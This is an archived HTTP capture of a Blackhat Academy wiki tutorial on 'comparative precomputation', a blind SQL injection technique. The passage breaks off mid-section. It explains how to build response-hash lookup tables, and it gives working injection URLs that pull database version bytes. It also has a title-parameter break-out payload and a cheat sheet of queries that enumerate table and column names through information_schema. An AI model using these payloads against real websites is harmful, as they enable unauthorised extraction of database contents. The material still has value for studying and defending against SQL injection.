@@ -1,0 +1,761 @@
+http://www.blackhatlibrary.net/Comparative_precomputation
+HTTP/1.1 200 OK
+Server: cloudflare-nginx
+Date: Thu, 24 Jul 2014 12:25:17 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Set-Cookie: __cfduid=de407118a4432e54eec352b4fbee5b9521406204715840; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.blackhatlibrary.net; HttpOnly
+X-Powered-By: PHP/5.4.15
+Content-language: en
+Vary: Accept-Encoding, Cookie
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Cache-Control: private, must-revalidate, max-age=0
+CF-RAY: 14f019720326087a-IAD
+Content-Encoding: gzip
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>SQL injection/Blind/Comparative precomputation - Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</title>
+<meta name="generator" content="MediaWiki" />
+<meta name="og:title" content="SQL injection/Blind/Comparative precomputation" />
+<meta name="og:type" content="article" />
+<meta name="og:image" content="http://www.blackhatacademy.org/security101/logo.png" />
+<meta name="og:site_name" content="Blackhat Academy - Security101 Wiki" />
+<meta name="og:description" content="For security reasons, we cannot remotely parse content.  Please visit the link provided to see the full article!" />
+<link rel="canonical" href="/SQL_injection/Blind/Comparative_precomputation" />
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="http://www.blackhatlibrary.net/api.php?action=rsd" />
+<link rel="alternate" type="application/atom+xml" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared&amp;only=styles&amp;skin=monobook&amp;*" />
+<link rel="stylesheet" href="/skins/monobook/main.css?" media="screen" />
+<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE50Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE55Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 6]><link rel="stylesheet" href="/skins/monobook/IE60Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 7]><link rel="stylesheet" href="/skins/monobook/IE70Fixes.css?" media="screen" /><![endif]--><meta name="ResourceLoaderDynamicStyles" content="" />
+<style type="text/css">/*<![CDATA[*/
+.source-php {line-height: normal;}
+.source-php li, .source-php pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for php
+ * CSS class: source-php, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.php.source-php .de1, .php.source-php .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
+.php.source-php  {font-family:monospace;}
+.php.source-php .imp {font-weight: bold; color: red;}
+.php.source-php li, .php.source-php .li1 {font-weight: normal; vertical-align:top;}
+.php.source-php .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.php.source-php .li2 {font-weight: bold; vertical-align:top;}
+.php.source-php .kw1 {color: #b1b100;}
+.php.source-php .kw2 {color: #000000; font-weight: bold;}
+.php.source-php .kw3 {color: #990000;}
+.php.source-php .kw4 {color: #009900; font-weight: bold;}
+.php.source-php .co1 {color: #666666; font-style: italic;}
+.php.source-php .co2 {color: #666666; font-style: italic;}
+.php.source-php .co3 {color: #0000cc; font-style: italic;}
+.php.source-php .co4 {color: #009933; font-style: italic;}
+.php.source-php .coMULTI {color: #666666; font-style: italic;}
+.php.source-php .es0 {color: #000099; font-weight: bold;}
+.php.source-php .es1 {color: #000099; font-weight: bold;}
+.php.source-php .es2 {color: #660099; font-weight: bold;}
+.php.source-php .es3 {color: #660099; font-weight: bold;}
+.php.source-php .es4 {color: #006699; font-weight: bold;}
+.php.source-php .es5 {color: #006699; font-weight: bold; font-style: italic;}
+.php.source-php .es6 {color: #009933; font-weight: bold;}
+.php.source-php .es_h {color: #000099; font-weight: bold;}
+.php.source-php .br0 {color: #009900;}
+.php.source-php .sy0 {color: #339933;}
+.php.source-php .sy1 {color: #000000; font-weight: bold;}
+.php.source-php .st0 {color: #0000ff;}
+.php.source-php .st_h {color: #0000ff;}
+.php.source-php .nu0 {color: #cc66cc;}
+.php.source-php .nu8 {color: #208080;}
+.php.source-php .nu12 {color: #208080;}
+.php.source-php .nu19 {color:#800080;}
+.php.source-php .me1 {color: #004000;}
+.php.source-php .me2 {color: #004000;}
+.php.source-php .re0 {color: #000088;}
+.php.source-php .ln-xtra, .php.source-php li.ln-xtra, .php.source-php div.ln-xtra {background-color: #ffc;}
+.php.source-php span.xtra { display:block; }
+
+/*]]>*/
+</style>
+<style type="text/css">/*<![CDATA[*/
+@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
+/*]]>*/
+</style><style type="text/css">/*<![CDATA[*/
+.source-sql {line-height: normal;}
+.source-sql li, .source-sql pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for sql
+ * CSS class: source-sql, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.sql.source-sql .de1, .sql.source-sql .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
+.sql.source-sql  {font-family:monospace;}
+.sql.source-sql .imp {font-weight: bold; color: red;}
+.sql.source-sql li, .sql.source-sql .li1 {font-weight: normal; vertical-align:top;}
+.sql.source-sql .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.sql.source-sql .li2 {font-weight: bold; vertical-align:top;}
+.sql.source-sql .kw1 {color: #993333; font-weight: bold;}
+.sql.source-sql .co1 {color: #808080; font-style: italic;}
+.sql.source-sql .coMULTI {color: #808080; font-style: italic;}
+.sql.source-sql .es0 {color: #000099; font-weight: bold;}
+.sql.source-sql .br0 {color: #66cc66;}
+.sql.source-sql .sy0 {color: #66cc66;}
+.sql.source-sql .st0 {color: #ff0000;}
+.sql.source-sql .nu0 {color: #cc66cc;}
+.sql.source-sql .ln-xtra, .sql.source-sql li.ln-xtra, .sql.source-sql div.ln-xtra {background-color: #ffc;}
+.sql.source-sql span.xtra { display:block; }
+
+/*]]>*/
+</style>
+<style type="text/css">/*<![CDATA[*/
+@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
+/*]]>*/
+</style></head>
+<body class="mediawiki ltr ns-0 ns-subject page-SQL_injection_Blind_Comparative_precomputation skin-monobook">
+<div id="globalWrapper">
+<div id="column-content"><div id="content">
+	<a id="top"></a>
+	<div id="siteNotice"><div id="localNotice"><div align="right"><i>Questions about this topic? <a href="/Special:UserLogin" title="Special:UserLogin">Sign up</a> to ask in the talk tab</i>.</div><br />
+</div></div>	<div align="center" id="ad"><script type="text/javascript"><!--
+google_ad_client = "ca-pub-3100048614381705";
+google_ad_slot = "3567986077";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+	<h1 id="firstHeading" class="firstHeading">SQL injection/Blind/Comparative precomputation</h1>
+	<div id="bodyContent">
+		<div id="siteSub">From Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</div>
+		<div id="contentSub">(Redirected from <a href="/index.php?title=Comparative_precomputation&amp;redirect=no" title="Comparative precomputation">Comparative precomputation</a>)</div>
+		<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>
+		<!-- start content -->
+<p><b>Comparative precomputation</b> attacks are a form of <i><a href="/Blind_SQL_injection" title="Blind SQL injection" class="mw-redirect">blind SQL injection</a></i> <a href="/Exploitation" title="Exploitation" class="mw-redirect">exploitation</a>, a two-part process in which the attacker crawls a particular sequence of data normally retrieved by the <a href="/Vulnerability" title="Vulnerability">vulnerable</a> <a href="/Input" title="Input">input</a> and uses the output to precompute a table for future comparison.  Once the table has been precomputed, it is possible to "lookup" <a href="/Hexadecimal" title="Hexadecimal" class="mw-redirect">hexadecimal</a>, <a href="/Binary" title="Binary" class="mw-redirect">binary</a>, and <a href="/Ascii" title="Ascii" class="mw-redirect">ascii</a> values within it.  In some cases it is possible to <i><a href="#Getting_past_the_byte">retrieve multiple bytes</a></i> per request from a remote <a href="/Database" title="Database">database</a> with blind injection by utilizing this technique.
+</p>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>This technique is much more efficient for blind data retrieval than <a href="/Boolean_enumeration" title="Boolean enumeration">boolean enumeration</a>, which requires as many as 8 <a href="/HTTP" title="HTTP">HTTP</a> requests to obtain the value of a single <a href="/Byte" title="Byte">byte</a>.  <i>Comparative precomputation</i> is the <i>quietest and fastest</i> known blind <a href="/SQL_injection" title="SQL injection">SQL injection</a> technique.
+</td></tr></table>
+<center><span><div style="border: 1px solid #000; height: 30px; width:60%;">
+<div style="width: 25%; float: left; padding-top:4px;"><a name="fb_share"></a><script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" type="text/javascript"></script></div>
+<div style="width: 25%; float: left; padding-top:6px;"><script type="text/javascript" src="http://www.reddit.com/static/button/button1.js"></script></div>
+<div style="width: 25%; float: left; padding-top:5px;"><a style="float:center;" data-related="blackhatstaff" data-count="0" data-via="blackhatstaff" href="https://twitter.com/share" class="twitter-share-button">Tweet</a><script src="//platform.twitter.com/widgets.js" type="text/javascript"></script>
+</div><div style="width: 25%; float: left; padding-top:5px;">
+<a class="DiggThisButton DiggCompact"></a><script type="text/javascript">
+(function() {
+  var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];
+  s.type = 'text/javascript';
+  s.async = true;
+  s.src = 'http://widgets.digg.com/buttons.js';
+  s1.parentNode.insertBefore(s, s1);
+})();
+</script></div>
+</div></span>
+</center>
+<table style="text-align:center; background: #fff; border: 1px solid #000; width: 50%; margin: 5px auto;">
+<tr>
+<td><i>SQL injection/Blind/Comparative precomputation requires a basic understanding of <a href="/SQL_injection" title="SQL injection">SQL injection</a> and <a href="/SQL_orientation" title="SQL orientation">manipulation of sql data</a></i>
+</td></tr></table>
+<p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1"><a href="#The_comparative_precomputation_attack"><span class="tocnumber">1</span> <span class="toctext">The comparative precomputation attack</span></a></li>
+<li class="toclevel-1"><a href="#Theory"><span class="tocnumber">2</span> <span class="toctext">Theory</span></a>
+<ul>
+<li class="toclevel-2"><a href="#Building_lookup_tables"><span class="tocnumber">2.1</span> <span class="toctext">Building lookup tables</span></a></li>
+<li class="toclevel-2"><a href="#Extracting_a_cell"><span class="tocnumber">2.2</span> <span class="toctext">Extracting a cell</span></a></li>
+<li class="toclevel-2"><a href="#Extracting_the_length_of_a_cell"><span class="tocnumber">2.3</span> <span class="toctext">Extracting the length of a cell</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="#Surpassing_obstacles"><span class="tocnumber">3</span> <span class="toctext">Surpassing obstacles</span></a>
+<ul>
+<li class="toclevel-2"><a href="#Non-sequential_identifiers"><span class="tocnumber">3.1</span> <span class="toctext">Non-sequential identifiers</span></a>
+<ul>
+<li class="toclevel-3"><a href="#Lookup_Table"><span class="tocnumber">3.1.1</span> <span class="toctext">Lookup Table</span></a></li>
+<li class="toclevel-3"><a href="#Data_extraction"><span class="tocnumber">3.1.2</span> <span class="toctext">Data extraction</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2"><a href="#String_column_index"><span class="tocnumber">3.2</span> <span class="toctext">String column index</span></a></li>
+<li class="toclevel-2"><a href="#Duplicate_http_responses"><span class="tocnumber">3.3</span> <span class="toctext">Duplicate http responses</span></a></li>
+<li class="toclevel-2"><a href="#Query_cheat_sheet"><span class="tocnumber">3.4</span> <span class="toctext">Query cheat sheet</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="#Getting_past_the_byte"><span class="tocnumber">4</span> <span class="toctext">Getting past the byte</span></a>
+<ul>
+<li class="toclevel-2"><a href="#Binary_optimization"><span class="tocnumber">4.1</span> <span class="toctext">Binary optimization</span></a>
+<ul>
+<li class="toclevel-3"><a href="#Sizing_the_hashtable"><span class="tocnumber">4.1.1</span> <span class="toctext">Sizing the hashtable</span></a></li>
+<li class="toclevel-3"><a href="#Response_extraction"><span class="tocnumber">4.1.2</span> <span class="toctext">Response extraction</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2"><a href="#Compression"><span class="tocnumber">4.2</span> <span class="toctext">Compression</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="#Proof_of_concept"><span class="tocnumber">5</span> <span class="toctext">Proof of concept</span></a>
+<ul>
+<li class="toclevel-2"><a href="#Video"><span class="tocnumber">5.1</span> <span class="toctext">Video</span></a></li>
+<li class="toclevel-2"><a href="#Download"><span class="tocnumber">5.2</span> <span class="toctext">Download</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="#Related"><span class="tocnumber">6</span> <span class="toctext">Related</span></a>
+<ul>
+<li class="toclevel-2"><a href="#Tools_.26_Articles"><span class="tocnumber">6.1</span> <span class="toctext">Tools &amp; Articles</span></a></li>
+<li class="toclevel-2"><a href="#Further_reading"><span class="tocnumber">6.2</span> <span class="toctext">Further reading</span></a></li>
+</ul>
+</li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="The_comparative_precomputation_attack">The comparative precomputation attack</span></h2>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>This attack heavily relies on the <i>remote dataset</i> for successful <a href="/Exploitation" title="Exploitation" class="mw-redirect">exploitation</a> and thus its rate of data retrieval is more variable than other methods.
+</td></tr></table>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<p><b>Requirements:</b>
+</p>
+<ul><li> <u>Before comparative precomputation can be initiated, an attacker or penetration tester must be aware of the vulnerable query's context (column and table names).</u>
+</li><li> <u>In order for it to be effectively faster than boolean enumeration, the contents of the query result context (column and table) must contain 3 or more instances of unique column and row data</u>
+</li></ul>
+</td></tr></table>
+<p>Precomputation using <b>md5</b> <a href="/Cryptography#hashes" title="Cryptography">hashing</a> is done in the <a href="#Proof_of_Concept:_sqli-hap.py">proof of concept</a> for performance and efficiency purposes.  At the very least, a comparative test will be required - without hashing, it is expected that ram usage may skyrocket.  The more complex a remote site is (random content generation, etc), the more difficult this type of <a href="/Sql_injection" title="Sql injection" class="mw-redirect">sql injection</a> <a href="/Exploitation" title="Exploitation" class="mw-redirect">attack</a> becomes to automate.
+</p>
+<h2> <span class="mw-headline" id="Theory"> Theory </span></h2>
+<p><b><a href="/Exploitation" title="Exploitation" class="mw-redirect">Exploitation</a> is a two part process:</b>
+</p>
+<dl><dd><ol><li> Precomputing the comparison data
+</li><li> Data extraction
+</li></ol>
+</dd></dl>
+<p><br />
+The example in this section (<i>Theory</i>) is a more basic explaination to prepare the reader's comprehension of the <a href="#Surpassing_obstacles">more advanced explanation</a> later and as such will be unlikely to exploit successfully.
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Building_lookup_tables"> Building lookup tables </span></h3>
+<ul><li> Take the following query
+</li></ul>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1">  <span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where id=&quot;</span> <span class="sy0">.</span> <span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'id'</span><span class="br0">&#93;</span><span class="sy0">;</span></pre></div></div>
+</td></tr></table>
+<ul><li> Being executed at the following uri:
+</li></ul>
+<pre> /articles.php?id=1
+</pre>
+<ul><li> Assume, for one moment, that there are 255 rows with sequential id's starting at 1 in the articles table.  It will rarely ever be this way in the wild.
+</li></ul>
+<ul><li> First, the attacker would crawl all of the pages at id's 1-255, saving them in a hashtable with the associated id used to generate the response.
+</li></ul>
+<h3> <span class="mw-headline" id="Extracting_a_cell"> Extracting a cell </span></h3>
+<ul><li> To determine the ascii code of the first character of the <a href="/Sql" title="Sql" class="mw-redirect">sql</a> version, an attacker might visit:
+</li></ul>
+<pre> /articles.php?id=ascii(substring(version() from 1 for 1))
+</pre>
+<p>The attacker would then take a <a href="/Cryptography" title="Cryptography">checksum</a> of the returned html data, and lookup the value of its corresponding numeric id which was saved during lookup table creation.  This numeric id's value now corresponds with the ascii value of the first <a href="/Byte" title="Byte">byte</a> of the version.  Following until the end of the cell, one could simply move to the next character:
+</p>
+<pre> /articles.php?id=ascii(substring(version() from 2 for 1))
+</pre>
+<h3> <span class="mw-headline" id="Extracting_the_length_of_a_cell"> Extracting the length of a cell </span></h3>
+<p>Suppose the goal in this situation is to obtain the length of the string returned by <a href="/SQL" title="SQL">SQL's</a> native <b>version()</b> function.  In some situations the <a href="/Database" title="Database">database</a> will treat the result of length() as a string or integer interchangably, however in some cases, <a href="/Programming#casting" title="Programming" class="mw-redirect">casting</a> may be required.  
+</p><p>The simple method for length determination of the version, or any cell is to treat the length as a string; for example an attacker may visit:
+</p>
+<pre> /articles.php?id=length((select length(version())))
+</pre>
+<p>This is because it is highly unlikely that the result of the version query will be longer than (9 * 10 ^ 255).  Once the length of the length is determined by treating the length's length as a single <a href="/Byte" title="Byte">byte</a> and looking it up in the table, an attacker could grab single bytes of the length by their <a href="/Ascii" title="Ascii" class="mw-redirect">ascii</a> codes:
+</p>
+<pre> /articles.php?id=ascii(substring(length(version()),1,1))
+</pre>
+<p>An attacker would then treat the length as a single cell being extracted until its value is determined.
+</p>
+<h2> <span class="mw-headline" id="Surpassing_obstacles"> Surpassing obstacles </span></h2>
+<p>With the <a href="#Building_lookup_tables">above example</a>, <a href="/Exploitation" title="Exploitation" class="mw-redirect">exploitation</a> in the wild is extremely unlikely, due to the fact that the id's in the articles table may not in fact be sequential - there may not even be 255 of them!  Or what if the index column for the <a href="/SQL_orientation#Where" title="SQL orientation">where clause</a> is a string?  What if there are duplicates in the retrieved data?
+</p>
+<h3> <span class="mw-headline" id="Non-sequential_identifiers"> Non-sequential identifiers </span></h3>
+<p>Different <a href="/Database_engine" title="Database engine" class="mw-redirect">SQL services</a> provide different interfaces for solving this problem.  This is where it becomes important to know the specific column name and table name for the injectable query.  
+</p><p>Starting with the original example query:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1">  <span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where id=&quot;</span> <span class="sy0">.</span> <span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'id'</span><span class="br0">&#93;</span><span class="sy0">;</span></pre></div></div>
+</td></tr></table>
+<p>The important bits are:
+</p>
+<ul><li> Current column name: id
+</li><li> Current table name: articles
+</li></ul>
+<p>Assuming that all of the articles are unique and that the id's are non-sequential, it is possible to retrieve 255 ordered results anyway.  
+</p>
+<h4> <span class="mw-headline" id="Lookup_Table"> Lookup Table </span></h4>
+<p>An attacker would visit the following url's during the lookup table's <a href="/Byte" title="Byte">byte</a> discovery (only 3 are shown):
+</p>
+<pre> /articles.php?id=(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=<b>1</b>)
+ /articles.php?id=(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=<b>2</b>)
+ ...
+ /articles.php?id=(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=<b>255</b>)
+</pre>
+<h4> <span class="mw-headline" id="Data_extraction"> Data extraction </span></h4>
+<p>Iterating until the length of the version, an attacker would use the following url's to extract bytes from the string:
+</p>
+<ol><li> /articles.php?id=(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=ascii(substring(version() from <b>1</b> for 1)))
+</li><li> /articles.php?id=(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=ascii(substring(version() from <b>2</b> for 1)))
+</li></ol>
+<h3> <span class="mw-headline" id="String_column_index"> String column index </span></h3>
+<p>Using the following example query:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1">  <span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where title='&quot;</span> <span class="sy0">.</span> <span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'title'</span><span class="br0">&#93;</span> <span class="sy0">.</span> <span class="st0">&quot;'&quot;</span><span class="sy0">;</span></pre></div></div>
+</td></tr></table>
+<p>And the following uri:
+</p>
+<pre> /articles.php?title=vulnerable_site
+</pre>
+<p>An attacker is able to change title to the following:
+</p>
+<pre> vulnerable_site' and 1=5 or title=([mapping or extraction query]) #' 
+</pre>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>When performing web-based attacks, the <b>"#"</b> character must be URL encoded to <b>%23</b> in the client browser to prevent the HTTP protocol from treating it as an <a href="/HTML" title="HTML">HTML</a> anchor.
+</td></tr></table>
+<p><br />
+</p>
+<h3> <span class="mw-headline" id="Duplicate_http_responses"> Duplicate http responses </span></h3>
+<p>The best way to avoid duplicate http responses is to modify the middle <a href="/SQL_orientation#SELECT_-_Select_data_from_a_table" title="SQL orientation">select query</a> containing the join to add a <a href="/SQL_orientation#Group_by" title="SQL orientation">group by clause</a>.  If the return data is grouped by the resulting display column containing duplicate data before the row counter is applied, it will force the return data to be unique so that 255 <i>unique</i> <a href="/Cryptography#hashes" title="Cryptography">checksums</a> may be collected.
+</p>
+<h3> <span class="mw-headline" id="Query_cheat_sheet"> Query cheat sheet </span></h3>
+<p>Byte discovery table generation query (iterating over each row for 0..255)&#160;:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="br0">&#40;</span><span class="kw1">SELECT</span> <span class="br0">&#91;</span><span class="kw1">COLUMN</span><span class="br0">&#93;</span> <span class="kw1">FROM</span>
+    <span class="br0">&#40;</span><span class="kw1">SELECT</span> <span class="br0">&#91;</span><span class="kw1">COLUMN</span><span class="br0">&#93;</span><span class="sy0">,</span>@r:<span class="sy0">=</span>@r<span class="sy0">+</span><span class="nu0">1</span> <span class="kw1">AS</span> pos <span class="kw1">FROM</span> <span class="br0">&#91;</span><span class="kw1">TABLE</span><span class="br0">&#93;</span> c <span class="kw1">JOIN</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> @r:<span class="sy0">=</span><span class="nu0">0</span><span class="br0">&#41;</span> r <span class="kw1">LIMIT</span> <span class="nu0">255</span><span class="br0">&#41;</span> x
+  <span class="kw1">WHERE</span> pos<span class="sy0">=</span>$counter<span class="br0">&#41;</span></pre></div></div>
+</td></tr></table>
+<p>Data extraction (iterating over each byte to get its value for 1..length(cell)):
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="br0">&#40;</span><span class="kw1">SELECT</span> <span class="br0">&#91;</span><span class="kw1">COLUMN</span><span class="br0">&#93;</span> <span class="kw1">FROM</span>
+    <span class="br0">&#40;</span><span class="kw1">SELECT</span> <span class="br0">&#91;</span><span class="kw1">COLUMN</span><span class="br0">&#93;</span><span class="sy0">,</span>@r:<span class="sy0">=</span>@r<span class="sy0">+</span><span class="nu0">1</span> <span class="kw1">AS</span> pos <span class="kw1">FROM</span> <span class="br0">&#91;</span><span class="kw1">TABLE</span><span class="br0">&#93;</span> c <span class="kw1">JOIN</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> @r:<span class="sy0">=</span><span class="nu0">0</span><span class="br0">&#41;</span> r <span class="kw1">LIMIT</span> <span class="nu0">255</span><span class="br0">&#41;</span> x
+    <span class="kw1">WHERE</span> pos<span class="sy0">=</span>ascii<span class="br0">&#40;</span><span class="kw1">SUBSTRING</span><span class="br0">&#40;</span>
+        <span class="br0">&#40;</span><span class="kw1">SELECT</span> group_concat<span class="br0">&#40;</span><span class="kw1">TABLE_NAME</span><span class="sy0">,</span>0x2e<span class="sy0">,</span>column_name<span class="br0">&#41;</span> <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> table_schema<span class="sy0">=</span><span class="kw1">DATABASE</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+    <span class="kw1">FROM</span> $counter <span class="kw1">FOR</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+  <span class="br0">&#41;</span>;</pre></div></div>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Getting_past_the_byte"> Getting past the byte </span></h2>
+<p>So far it is proven that a single byte of data can be extracted.  In review:
+</p>
+<ul><li> A hashtable must be built using resultset rows 0-255 to retrieve the value of a byte in a single request.
+</li><li> This number of rows is 256 (0-255 starting from 0 is 256 values) because 2^8=256 and 8 bits are in a byte.
+</li></ul>
+<p>Fortunately for <a href="/Hackers" title="Hackers">exploit developers</a>, most <a href="/SQL" title="SQL">SQL</a> services provide multiple ways of converting string or other data to its <a href="/Binary" title="Binary" class="mw-redirect">binary</a> format.  
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Binary_optimization"> <a href="/Binary" title="Binary" class="mw-redirect">Binary</a> optimization </span></h3>
+<p>This means that if there are even as few as 3 rows in the table, combined with a null identifier row (most likely a blank response; the same response would be obtained with a nonexistent index being placed into the where clause) there are 4 obtainable values - the same number of values provided by two bits (1/4 of 1 byte).  This would allow for the retrieval of 1/4 of 1 <a href="/Byte" title="Byte">byte</a> per request - still faster than <a href="/Boolean_enumeration" title="Boolean enumeration">boolean enumeration's</a> single bit per request.
+</p><p>In other cases, it also means that if there are 65,355 rows in the affected result set, it is possible to extract <i>two <a href="/Byte" title="Byte">bytes</a></i>, a full word - per request.  Due to lookup table construction, this is only a performance optimization over extracting a single byte under the circumstance that the attacker intends to retreive more than 65 kilobytes of data from the remote <a href="/Database" title="Database">database</a> (an optimization nonetheless).
+</p><p><br />
+</p>
+<h4> <span class="mw-headline" id="Sizing_the_hashtable"> Sizing the hashtable </span></h4>
+<p>The largest possible value to retrieve in a single request is equal to the result of the following query:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> <span class="kw1">SELECT</span> <span class="kw1">COUNT</span><span class="br0">&#40;</span>context_column<span class="br0">&#41;</span> <span class="kw1">FROM</span> context_table</pre></div></div>
+</td></tr></table>
+<p>So in the `articles' example, the result of:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> <span class="kw1">SELECT</span> <span class="kw1">COUNT</span><span class="br0">&#40;</span>id<span class="br0">&#41;</span><span class="sy0">+</span><span class="nu0">1</span> <span class="kw1">FROM</span> articles</pre></div></div>
+</td></tr></table>
+<p>This is the maximum bitwise or binary value we can obtain in a single request (called <i>context_result_count</i>). 
+</p>
+<ul><li> The following equation can be used to determine the maximum bits available to extract in a single request (max_bits):
+</li></ul>
+<pre>n        = log(context_result_count) / log(2)
+max_bits = n - (n&#160;% 1)
+</pre>
+<h4> <span class="mw-headline" id="Response_extraction"> Response extraction </span></h4>
+<dl><dd><i>See Also: <a href="/Bitwise_math" title="Bitwise math">bitwise math</a></i>
+</dd></dl>
+<p>To get at <a href="/Binary" title="Binary" class="mw-redirect">binary</a> data, the <a href="/Hexadecimal" title="Hexadecimal" class="mw-redirect">hexadecimal</a> value of the concatenated first two <a href="/Byte" title="Byte">bytes</a> in the version() string is casted to an integer for extraction:
+</p>
+<table class="wikitable" width="100%">
+<tr>
+<td>
